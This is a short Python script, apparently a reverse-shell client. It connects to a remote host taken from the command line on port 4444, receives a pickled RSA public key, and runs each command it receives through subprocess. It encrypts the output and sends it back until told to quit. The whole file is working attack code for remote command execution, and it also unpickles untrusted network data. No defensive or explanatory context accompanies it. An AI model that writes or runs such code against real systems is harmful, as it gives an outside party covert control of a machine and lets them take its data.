#!/usr/bin/python

import socket, subprocess, sys
from Crypto.PublicKey import RSA
from Crypto.Hash import SHA256
import pickle


RHOST = sys.argv[1]
RPORT = 4444

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((RHOST, RPORT))

def recieve_key():
    data_key = s.recv(1024)
    return data_key

pickled_publickey = recieve_key()
public_key = pickle.loads(pickled_publickey)


while True :
    command = s.recv(1024)
    if command == 'quit' :
        break
    reply = subprocess.Popen(str(command), shell=False, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
    stdout, stderr = reply.communicate()
    en_reply = public_key.encrypt(stdout, 32)
    s.send(pickle.dumps(en_reply))

s.close()

    
    
    
    
